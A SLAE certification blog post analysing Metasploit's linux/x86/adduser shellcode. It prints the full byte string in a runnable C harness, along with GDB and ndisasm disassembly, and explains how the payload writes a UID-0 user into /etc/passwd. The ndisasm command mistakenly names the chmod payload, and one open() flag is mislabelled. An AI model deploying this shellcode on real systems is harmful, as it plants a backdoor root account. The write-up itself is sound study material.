# Assignment #5: Metasploit adduser

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

## Solution

In this assignment we will take up the `linux/x86/adduser` shellcode from Metasploit, as generated by msfpayload. 

For this shellcode to work, we must provide it with at least a username and a password. For the purposes of this assignment, we will also add the Shell to specify which environment we want to be configured for the newly created user.


## Analysis

Let us begin by generating and running the shellcode with Libemu to determine the execution flow.

```
msfpayload linux/x86/adduser USER=slae PASS=isAwesome SHELL=/bin/bash R > a5-msf_adduser
sctest -Svvvs 100000000000000 -G a5-msf_adduser.dot < a5-msf_adduser 
dot -Tpng a5-msf_adduser.dot > a5-msf_adduser.png 
```

Unfourtunately, Libemu fails to produce any useful output. The dot and png files are also empty. 

In order for us to be able to trace the execution flow of the shellcode, we need to be able to execute it in the first place. So lets go ahead and generate the shellcode in C format and append an execution skeleton to it.

```bash
msfpayload linux/x86/adduser USER=slae PASS=isAwesome SHELL=/bin/bash C > a5-msf_adduser.c
```

#### a5-msf_adduser.c

```c
#include<stdio.h>
#include<string.h>
/*
 * linux/x86/adduser - 93 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, USER=slae, PASS=isAwesome, SHELL=/bin/bash
 */
unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x73\x6c"
"\x61\x65\x3a\x41\x7a\x6a\x38\x5a\x6a\x47\x72\x6e\x73\x5a\x69"
"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62"
"\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01"
"\x58\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Now to compile and onto debugging!

```bash
gcc a5-msf_adduser.c -o a5-msf_adduser -fno-stack-protector -z execstack
gdb a5-msf_adduser
```

```
gdb$ b *&code
Breakpoint 1 at 0x8049760


gdb$ run


gdb$ pdisass 
Dump of assembler code for function code:
=> 0x08049760 <+0>:	xor    ecx,ecx
   0x08049762 <+2>:	mov    ebx,ecx
   0x08049764 <+4>:	push   0x46
   0x08049766 <+6>:	pop    eax
   0x08049767 <+7>:	int    0x80
   0x08049769 <+9>:	push   0x5
   0x0804976b <+11>:	pop    eax
   0x0804976c <+12>:	xor    ecx,ecx
   0x0804976e <+14>:	push   ecx
   0x0804976f <+15>:	push   0x64777373
   0x08049774 <+20>:	push   0x61702f2f
   0x08049779 <+25>:	push   0x6374652f
   0x0804977e <+30>:	mov    ebx,esp
   0x08049780 <+32>:	inc    ecx
   0x08049781 <+33>:	mov    ch,0x4
   0x08049783 <+35>:	int    0x80
   0x08049785 <+37>:	xchg   ebx,eax
   0x08049786 <+38>:	call   0x80497af <code+79>							; shifted code, disassemble this function
   0x0804978b <+43>:	jae    0x80497f9
   0x0804978d <+45>:	popa   
   0x0804978e <+46>:	cmp    al,BYTE PTR gs:[ecx+0x7a]
   0x08049792 <+50>:	push   0x38
   0x08049794 <+52>:	pop    edx
   0x08049795 <+53>:	push   0x47
   0x08049797 <+55>:	jb     0x8049807
   0x08049799 <+57>:	jae    0x80497f5
   0x0804979b <+59>:	imul   esp,DWORD PTR [ebx+0x3a],0x3a303a30
   0x080497a2 <+66>:	cmp    ch,BYTE PTR [edi]
   0x080497a4 <+68>:	cmp    ch,BYTE PTR [edi]
   0x080497a6 <+70>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x080497a9 <+73>:	das    
   0x080497aa <+74>:	bound  esp,QWORD PTR [ecx+0x73]
   0x080497ad <+77>:	push   0x518b590a
   0x080497b2 <+82>:	cld    
   0x080497b3 <+83>:	push   0x4
   0x080497b5 <+85>:	pop    eax
   0x080497b6 <+86>:	int    0x80
   0x080497b8 <+88>:	push   0x1
   0x080497ba <+90>:	pop    eax
   0x080497bb <+91>:	int    0x80
   0x080497bd <+93>:	add    BYTE PTR [eax],al
End of assembler dump.


gdb$ pdisass 0x80497af <code+79>
Dump of assembler code from 0x80497af to 0x80497cf::	
   0x080497af <code+79>:	pop    ecx
   0x080497b0 <code+80>:	mov    edx,DWORD PTR [ecx-0x4]
   0x080497b3 <code+83>:	push   0x4
   0x080497b5 <code+85>:	pop    eax
   0x080497b6 <code+86>:	int    0x80
   0x080497b8 <code+88>:	push   0x1
   0x080497ba <code+90>:	pop    eax
   0x080497bb <code+91>:	int    0x80
   0x080497bd <code+93>:	add    BYTE PTR [eax],al
   0x080497bf:	add    BYTE PTR [eax],al
   0x080497c1:	add    BYTE PTR [eax],al
   0x080497c3:	add    BYTE PTR [eax],al
   0x080497c5:	add    BYTE PTR [eax],al
   0x080497c7:	add    BYTE PTR [eax],al
   0x080497c9:	add    BYTE PTR [eax],al
   0x080497cb:	add    BYTE PTR [eax],al
   0x080497cd:	add    BYTE PTR [eax],al
End of assembler dump.
```

Finally, we disassemble raw shellcode with Ndisasm

```
msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 R | ndisasm -u -
```

and proceed to analyze it with GDB output, the following C libraries

- `/usr/include/i386-linux-gnu/asm/unistd_32.h`
- `/usr/include/asm-generic/fcntl.h`

as well as the Intel Assembly Instruction Set manual

- `64-ia-32-architectures-software-developer-vol-2a-2b-instruction-set-a-z-manual.pdf`

The following is the disassembled shellcode, commented as part of the analysis:
 
```nasm
00000000  31C9              xor ecx,ecx						; ecx = 0 (euid)
00000002  89CB              mov ebx,ecx						; ebx = 0 (ruid)
00000004  6A46              push byte +0x46					; #define __NR_setreuid 70
00000006  58                pop eax							; eax = int setreuid(uid_t ruid, uid_t euid);
00000007  CD80              int 0x80						; set real and effective user ID to 0 (root)
00000009  6A05              push byte +0x5					; #define __NR_open 5
0000000B  58                pop eax							  ; eax = int open(const char *pathname, int flags);
0000000C  31C9              xor ecx,ecx						; ecx = 0 
0000000E  51                push ecx						  ; put NULL dword on the stack
0000000F  6873737764        push dword 0x64777373			; string: dwss
00000014  682F2F7061        push dword 0x61702f2f			; string: ap//
00000019  682F657463        push dword 0x6374652f			; string: cte/
0000001E  89E3              mov ebx,esp						; ebx = /etc/passwd (pathname)
00000020  41                inc ecx							  ; ecx = 1 	(flags)	#define O_WRONLY        00000001
00000021  B504              mov ch,0x4						; ecx = 401 (flags)	#define O_NOCTTY        00000400
00000023  CD80              int 0x80						  ; open /etc/passwd for writing without controlling terminal
00000025  93                xchg eax,ebx						; eax = 0, ebx = file descriptor (fd)

																	      ; from here on GDB was used to understand the code

00000026  E824000000        call dword 0x4f 				   ; put PAYLOAD address on the stack
 |
 +->0000004F	0x080497af <code+79>:	pop    ecx 							; ecx = EIP return address [PAYLOAD @ 0000002B] (buf)
	00000050	0x080497b0 <code+80>:	mov    edx,DWORD PTR [ecx-0x4]	; edx = EIP return address - 4 [DWORD @ 00000027 = 24000000] (count)
	00000053	0x080497b3 <code+83>:	push   0x4								; #define __NR_write 4
	00000055	0x080497b5 <code+85>:	pop    eax 								; eax = ssize_t write(int fd, const void *buf, size_t count);
	00000056	0x080497b6 <code+86>:	int    0x80 							; write PAYLOAD to /etc/passwd (length = 0x24 bytes in little endian)
	00000058	0x080497b8 <code+88>:	push   0x1								; #define __NR_exit 1
	0000005A	0x080497ba <code+90>:	pop    eax 								; eax = void exit(int status);
	0000005B	0x080497bb <code+91>:	int    0x80 							; exit
				0x080497bd <code+93>:	add    BYTE PTR [eax],al 			; this does not get executed

																	      ; PAYLOAD = slae:Azj8ZjGrnsZic:0:0::/:/bin/bash\n 	(0x24 = 36 bytes) 
0000002B  736C              jnc 0x99
0000002D  61                popad
0000002E  653A417A          cmp al,[gs:ecx+0x7a]
00000032  6A38              push byte +0x38
00000034  5A                pop edx
00000035  6A47              push byte +0x47
00000037  726E              jc 0xa7
00000039  735A              jnc 0x95
0000003B  69633A303A303A    imul esp,[ebx+0x3a],dword 0x3a303a30
00000042  3A2F              cmp ch,[edi]
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  626173            bound esp,[ecx+0x73]
0000004D  680A598B51        push dword 0x518b590a
																	     ; write PAYLOAD to /etc/passwd (length = 36 bytes in little endian)
00000052  FC                cld
00000053  6A04              push byte +0x4
00000055  58                pop eax
00000056  CD80              int 0x80
00000058  6A01              push byte +0x1
0000005A  58                pop eax
0000005B  CD80              int 0x80
```


## Discussion and Conclusions

Our analysis has revealed how the Metasploit adduser shellcode operates.

The program first obtains root privileges by setting its real and effective user ID to 0. Next, it uses the `open()` system call to create a file descriptor for `/etc/passwd`; appends `slae:Azj8ZjGrnsZic:0:0::/:/bin/bash\n` with the `write()` system call; and exists gracefully. The aforementioned data will effectively allow the user `slae` to login with the password `isAwesome`. This user will have user ID of 0 (root), `/` as the home directory, and `/bin/bash` as the default shell.


## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-5/adduser/example.png "Example")
